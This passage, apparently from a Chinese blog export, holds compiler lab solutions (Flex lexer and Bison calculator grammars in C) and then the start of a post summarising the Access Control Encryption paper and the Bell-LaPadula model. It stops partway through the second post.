LBRACK\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;RBRACK&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: RBRACK\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;LPAREN&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: LPAREN\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;RPAREN&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: RPAREN\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;COMMA&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: COMMA\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;SEMICOLON&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: SEMICOLON\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;PERIOD&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: PERIOD\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;BECOME&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: BECOME\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;COLON&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: COLON\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;BEGINSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: BEGINSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ENDSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: ENDSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;IFSYM&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: IFSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;THENSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: THENSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ELSESYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: ELSESYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;WHILESYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: WHILESYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;DOSYM&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: DOSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;CALLSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: CALLSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;CONSTSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: CONSTSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;TYPESYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: TYPESYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;VARSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: VARSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;PROCSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: PROCSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;CHARCON&#125;        &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: CHARCON\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;IDENT&#125;          &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: IDENT\n&quot;</span>, yytext);&#125;</span><br><span class="line">&#123;ERROR&#125; 		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: ERROR\n&quot;</span>,yytext);&#125;</span><br><span class="line">\n				&#123;&#125;</span><br><span class="line">.				&#123;&#125;</span><br><span class="line">%% <span class="comment">/*** end ***/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(yyin = <span class="built_in">fopen</span>(argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">			<span class="built_in">perror</span>(argv[<span class="number">1</span>]);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">yylex</span>());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第5关bison入门逆波兰式计算"><a class="markdownIt-Anchor" href="#第5关bison入门逆波兰式计算"></a> 第5关：Bison入门（逆波兰式计算）</h3>
<p>就是语法的生成式的编写。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> %&#123;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">yylex</span> <span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">yyerror</span> <span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> *)</span></span>;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define api.value.type &#123;<span class="keyword">double</span>&#125;</span><br><span class="line">%token NUM</span><br><span class="line"></span><br><span class="line">%% </span><br><span class="line"><span class="comment">/* Grammar rules and actions follow.  */</span></span><br><span class="line">input:</span><br><span class="line">  %empty</span><br><span class="line">| input line</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line:</span><br><span class="line">  <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">| exp <span class="string">&#x27;\n&#x27;</span>      &#123; <span class="built_in">printf</span> (<span class="string">&quot;%.10g\n&quot;</span>, $<span class="number">1</span>); &#125;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">exp:</span><br><span class="line">  NUM     &#123; $$ = $<span class="number">1</span>;&#125;</span><br><span class="line"> <span class="comment">/* begin */</span></span><br><span class="line"> | exp exp &#x27;+ &#x27; &#123;$$=$1+$2;&#125;</span><br><span class="line"> | exp exp <span class="string">&#x27;-&#x27;</span> &#123;$$=$<span class="number">1</span>-$<span class="number">2</span>;&#125;</span><br><span class="line"> | exp exp <span class="string">&#x27;*&#x27;</span>&#123;$$=$<span class="number">1</span>*$<span class="number">2</span>;&#125;</span><br><span class="line"> | exp exp <span class="string">&#x27;/&#x27;</span> &#123;$$=$<span class="number">1</span>/$<span class="number">2</span>;&#125;</span><br><span class="line"> | exp exp <span class="string">&#x27;^&#x27;</span>&#123;$$=<span class="built_in">pow</span>($<span class="number">1</span>,$<span class="number">2</span>);&#125;</span><br><span class="line"> | exp  <span class="string">&#x27;n&#x27;</span> &#123;$$=-$<span class="number">1</span>;&#125;</span><br><span class="line"> <span class="comment">/* end */</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The lexical analyzer returns a double floating point</span></span><br><span class="line"><span class="comment">   number on the stack and the token NUM, or the numeric code</span></span><br><span class="line"><span class="comment">   of the character read if not a number.  It skips all blanks</span></span><br><span class="line"><span class="comment">   and tabs, and returns 0 for end-of-input.  */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c;</span><br><span class="line">  <span class="comment">/* Skip white space.  */</span></span><br><span class="line">  <span class="keyword">while</span> ((c = <span class="built_in">getchar</span> ()) == <span class="string">&#x27; &#x27;</span> || c == <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process numbers.  */</span></span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;.&#x27;</span> || <span class="built_in">isdigit</span> (c))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">ungetc</span> (c, stdin);</span><br><span class="line">      <span class="built_in">scanf</span> (<span class="string">&quot;%lf&quot;</span>, &amp;yylval);</span><br><span class="line">      <span class="keyword">return</span> NUM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Return end-of-input.  */</span></span><br><span class="line">  <span class="keyword">if</span> (c == EOF)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">  	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* Return a single char.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">yyparse</span>();</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Called by yyparse on error.  */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span> <span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span> (stderr, <span class="string">&quot;%s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第6关bison入门中缀式计算"><a class="markdownIt-Anchor" href="#第6关bison入门中缀式计算"></a> 第6关：bison入门（中缀式计算）</h3>
<p>从入门到吃土。饶命.jpg。</p>
<p>（声明会影响算符的优先级？）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> *)</span></span>;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%define api.value.type &#123;<span class="keyword">double</span>&#125;</span><br><span class="line"><span class="comment">/* Tokens */</span></span><br><span class="line">%token NUM</span><br><span class="line">%token EOL</span><br><span class="line">%token ADD SUB MUL DIV</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* begin */</span></span><br><span class="line">%left ADD  SUB</span><br><span class="line">%left MUL  DIV</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* end */</span></span><br><span class="line">%% </span><br><span class="line">  <span class="comment">/* Grammar rules and actions follow.  */</span></span><br><span class="line"> <span class="comment">/* begin */</span></span><br><span class="line">calclist:</span><br><span class="line">	%empty</span><br><span class="line">	|calclist exp EOL &#123;<span class="built_in">printf</span>(<span class="string">&quot;=%.10g\n&quot;</span>,$<span class="number">2</span>);&#125;</span><br><span class="line">exp:term</span><br><span class="line">	;</span><br><span class="line"></span><br><span class="line">term:NUM    &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">| term ADD   term &#123;$$=$<span class="number">1</span>+$<span class="number">3</span>;&#125;</span><br><span class="line">| term SUB  term &#123;$$=$<span class="number">1</span>-$<span class="number">3</span>;&#125;</span><br><span class="line">| term MUL term &#123;$$=$<span class="number">1</span>*$<span class="number">3</span>;&#125;</span><br><span class="line">| term DIV  term &#123;$$=$<span class="number">1</span>/$<span class="number">3</span>;&#125;</span><br><span class="line">	;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* end */</span></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The lexical analyzer returns a double floating point</span></span><br><span class="line"><span class="comment">   number on the stack and the token NUM, or the numeric code</span></span><br><span class="line"><span class="comment">   of the character read if not a number.  It skips all blanks</span></span><br><span class="line"><span class="comment">   and tabs, and returns 0 for end-of-input.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* begin */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> c;</span><br><span class="line">	<span class="keyword">while</span>((c=<span class="built_in">getchar</span>())==<span class="string">&#x27; &#x27;</span>||c==<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">if</span>(c==<span class="string">&#x27;.&#x27;</span>||<span class="built_in">isdigit</span>(c))</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="built_in">ungetc</span>(c,stdin);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>,&amp;yylval)!=<span class="number">1</span>)</span><br><span class="line">		<span class="built_in">abort</span>();</span><br><span class="line">	<span class="keyword">return</span> NUM;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span>(c)&#123;</span><br><span class="line">	<span class="keyword">case</span> EOF: <span class="keyword">return</span> YYEOF;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:<span class="keyword">return</span> EOL;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> ADD;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> SUB;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> MUL;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: <span class="keyword">return</span> DIV;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> c;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">yyparse</span>();</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Called by yyparse on error.  */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span> <span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span> (stderr, <span class="string">&quot;%s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第7关flexbison联合使用"><a class="markdownIt-Anchor" href="#第7关flexbison联合使用"></a> 第7关：Flex+Bison联合使用</h3>
<p>注意取反的那个具有最高的优先级，拿出来单算。因为和SUB一个符号，真是让人头痛。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Filename:lab107.y</span></span><br><span class="line"><span class="comment">Author:</span></span><br><span class="line"><span class="comment">Date:</span></span><br><span class="line"><span class="comment">Makefile:</span></span><br><span class="line"><span class="comment">______________</span></span><br><span class="line"><span class="comment">scanner:lab107.l lab107.y</span></span><br><span class="line"><span class="comment">	bison -v -d lab107.y</span></span><br><span class="line"><span class="comment">	flex lab107.l</span></span><br><span class="line"><span class="comment">	gcc -o scanner 406.tab.c lex.yy.c -lm -lfl</span></span><br><span class="line"><span class="comment">.PHONY:clean</span></span><br><span class="line"><span class="comment">clean:</span></span><br><span class="line"><span class="comment">	rm scanner lab107.tab.c lex.yy.c lab107.tab.h</span></span><br><span class="line"><span class="comment">_______________</span></span><br><span class="line"><span class="comment">Description:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// Notice: &#x27;-&#x27; using as -5+2=-3 ;or 5-2, need something special. By LM. 2021 using </span></span><br><span class="line"><span class="comment">// with %precedence NEG used as the highest token, higher than &#x27;^&#x27;, then we can get -2^2=4; without %prec NEG in the rule, SUB is lower than ^, then -2^2=-4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> yylineno;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span>;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define api.value.type &#123;<span class="keyword">double</span>&#125;</span><br><span class="line">%token NUM</span><br><span class="line">%token EOL</span><br><span class="line">%token ADD </span><br><span class="line">%token SUB </span><br><span class="line">%token MUL </span><br><span class="line">%token DIV</span><br><span class="line">%token EXPO</span><br><span class="line">%token LP</span><br><span class="line">%token RP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">calclist:</span><br><span class="line">	%empty</span><br><span class="line">	|calclist exp EOL &#123;<span class="built_in">printf</span>(<span class="string">&quot;=%.10g\n&quot;</span>,$<span class="number">2</span>);&#125;</span><br><span class="line">	</span><br><span class="line">exp:term &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">   	| exp ADD exp &#123;$$=$<span class="number">1</span>+$<span class="number">3</span>;&#125;</span><br><span class="line">	| exp SUB exp &#123;$$=$<span class="number">1</span>-$<span class="number">3</span>;&#125;</span><br><span class="line">	| exp MUL exp &#123;$$=$<span class="number">1</span>*$<span class="number">3</span>;&#125;</span><br><span class="line">	| exp DIV exp &#123;$$=$<span class="number">1</span>/$<span class="number">3</span>;&#125;</span><br><span class="line">	| exp EXPO  exp &#123; $$ = <span class="built_in">pow</span> ($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">	| LP  exp  RP &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">	| error &#123;&#125;</span><br><span class="line">	;</span><br><span class="line"></span><br><span class="line">term:NUM   &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">| SUB NUM  &#123;$$=-$<span class="number">2</span>;&#125;</span><br><span class="line">	;</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> args,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">	<span class="built_in">yyparse</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> *s)</span></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr,<span class="string">&quot;MyError:%s yylineno:%d\n&quot;</span>,s,yylineno);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h3>
<p>【1】<a href="https://blog.csdn.net/qq_35886593/article/details/90694664">BISON分析器详解！与flex完美CP</a></p>
<p>【2】<a href="https://blog.csdn.net/sirouni2003/article/details/400672?ops_request_misc=%7B%22request%5Fid%22%3A%22163543054116780264043602%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=163543054116780264043602&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-400672.pc_search_result_cache&amp;utm_term=Bison%E6%89%8B%E5%86%8C&amp;spm=1018.2226.3001.4187">GNU Bison 中文手册</a></p>
]]></content>
      <categories>
        <category>实验</category>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>访问控制加密(ACE)</title>
    <url>/2021/07/30/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%8A%A0%E5%AF%86-ACE/</url>
    <content><![CDATA[<hr />
<div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>论文题目：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mi>c</mi><mi>c</mi><mi>e</mi><mi>s</mi><mi>s</mi><mtext>  </mtext><mi>C</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>l</mi><mtext>  </mtext><mi>E</mi><mi>n</mi><mi>c</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>  </mtext><mo>:</mo><mi>E</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>c</mi><mi>i</mi><mi>n</mi><mi>g</mi><mtext>  </mtext><mi>I</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>  </mtext><mi>F</mi><mi>l</mi><mi>o</mi><mi>w</mi><mtext>  </mtext><mi>W</mi><mi>i</mi><mi>t</mi><mi>h</mi><mtext>  </mtext><mi>C</mi><mi>r</mi><mi>y</mi><mi>p</mi><mi>t</mi><mi>o</mi><mi>g</mi><mi>r</mi><mi>a</mi><mi>p</mi><mi>h</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">Access\;Control\;Encryption\;:Enforcing\;Information\;Flow\;With\;Cryptography</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault">c</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">p</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span></p>
</div>
<hr />
<h1 id="ace框架"><a class="markdownIt-Anchor" href="#ace框架"></a> ACE框架</h1>
<h2 id="论文背景"><a class="markdownIt-Anchor" href="#论文背景"></a> 论文背景</h2>
<p>该篇文章介绍的访问控制加密是基于公钥广播加密的访问控制(下文中会有明显的介绍)。<br></p>
<p>传统的密码学对明文消息进行加密，加密后的明文如果是广播出去的话，任何人都能够拿到密文，显然是可以被攻击的。作者构想的访问控制加密首先想到只有拥有解密密钥的人才可以了解到明文，这一点与传统密码学类似。考虑到更加复杂的情况，在不相信任何人的情况下，使得广播出去的密文只有指定的接受者能够拿到正确的密文，而其他的接受者拿到的是错误的密文甚至是随机值。<br></p>
<p>这里会提到一个存在的模型：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>B</mi><mi>e</mi><mi>l</mi><mi>l</mi><mo>−</mo><mi>L</mi><mi>a</mi><mi>p</mi><mi>a</mi><mi>d</mi><mi>u</mi><mi>l</mi><mi>a</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">Bell-Lapadula\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault">a</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>模型，大致就是对一个用户系统进行分级，不同的用户对应不同的权限标识，如从底层的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mi>u</mi><mi>b</mi><mi>l</mi><mi>i</mi><mi>c</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">Public\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault">u</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>权限到顶层的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mi>o</mi><mi>p</mi><mo>−</mo><mi>s</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>e</mi><mi>t</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">Top-secret\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">o</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord 